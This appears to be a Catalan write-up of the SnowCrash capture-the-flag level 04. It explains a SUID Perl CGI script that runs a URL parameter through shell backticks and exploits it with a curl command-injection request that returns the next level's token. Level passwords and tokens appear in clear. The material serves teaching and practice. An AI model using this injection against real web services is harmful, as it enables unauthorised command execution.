# TL;DR / TLTR
##### Ens connectem al següent nivell amb el token/password obtingut en el nivell anterior:
```bash
level03@SnowCrash:~$ ssh level04@192.168.122.220 -p 4242 
Could not create directory '/home/user/level03/.ssh'.
The authenticity of host '[192.168.122.220]:4242 ([192.168.122.220]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level03/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level04@192.168.122.220's password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$
```
##### Llistem fitxers i directoris visible si ocults
```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
level04@SnowCrash:~
```
##### Observem un fitxer anomenat level04 amb un format curiós ".pl", a més de detectar que també hi ha permís de SUID, tal i com ens indiquen les dues lletres 's'
```bash
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
##### Prosseguim a analitzar a l'esmentat fitxer
```perl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$
```
```text
Bé, tenim un script amb llenguatge de progrmació perl tal i com ens delata el shebang i el format del mateix escript .pl
```
##### Dessglossament del script de perl:
###### Shebang
```perl
#!/usr/bin/perl 
```
###### Comentari indicant que aquest CGI s'executa al servidor web local al port 4747
```perl
# localhost:4747
```
###### Importació del modul CGI
```perl
use CGI qw{param};
```
```text
use CGI → importa el mòdul CGI, que serveix per gestionar peticions web. Un CGI rep dades via URL (HTTP), les processa i retorna resposta.
qw{param} → sintaxi de Perl que crea una llista de strings; és equivalent a ("param")
param → funció del mòdul CGI que permet obtenir paràmetres de la URL o del formulari.
Exemple:
http://localhost:4747/script.pl?x=hola
→ param("x") retornaria "hola"
```
###### Línia de funció print
```perl
print "Content-type: text/html\n\n";
```
```text
print → imprimeix a la sortida estàndard (stdout).
"Content-type: text/html\n\n":
Content-type: text/html → capçalera HTTP que indica que la resposta és HTML
\n\n → dues línies noves → separa headers del cos HTTP
(Sense això, el navegador no entendria la resposta)
```
###### Anàlisi del statement
```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
```
```text
· sub x {
sub → defineix una funció
x → nom de la funció
{ ... } → bloc de codi

· $y = $_[0];
$y → variable escalar
$_[0] → primer argument passat a la funció
En Perl: $_[0] → primer paràmetre / $_[1] → segon, etc.
Per tant: $y = argument_de_la_funció

· print `echo $y 2>&1`;
Backticks (`...`): Executen una comanda del sistema (shell) i Retornen la sortida de la comanda
Equivalent a: $output = `comanda`;

· echo $y → Executa la comanda echo i Imprimeix el contingut de $y

· 2>&1 → Redirecció de shell: 2 → stderr (errors) i 1 → stdout. Per tant 2>&1 → envia errors cap a la sortida normal. Així es mostren tant errors com output.

· x(param("x"));
param("x") → obté el paràmetre x de la URL i es passa com a argument a la funció x
Flux complet:
Usuari fa petició amb ?x=...
param("x") agafa el valor
es passa a x()
es guarda a $y
s’executa com a comanda shell
```
###### Comprovem si realment hi ha un servei escoltant a localhost:4747
```bash
level04@SnowCrash:~$ netstat -tulpn | grep 4747
(No info could be read for "-p": geteuid()=2004 but you should be root.)
tcp6       0      0 :::4747                 :::*                    LISTEN      -     
```
```text
Explicació:
PART	        SIGNIFICAT
netstat	      veure connexions
-t	          TCP
-u	          UDP
-l	          listening
-p	          processos
-n	          ports numèrics
```
##### Provem de fer la injecció de comanda i a veure si podem obtenir el password
```bash
level04@SnowCrash:~$ curl 'http://localhost:4747/?x=test'
test
level04@SnowCrash:~$ curl 'http://localhost:4747/?x=getflag'
getflag
level04@SnowCrash:~$ curl 'http://localhost:4747/?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ 
```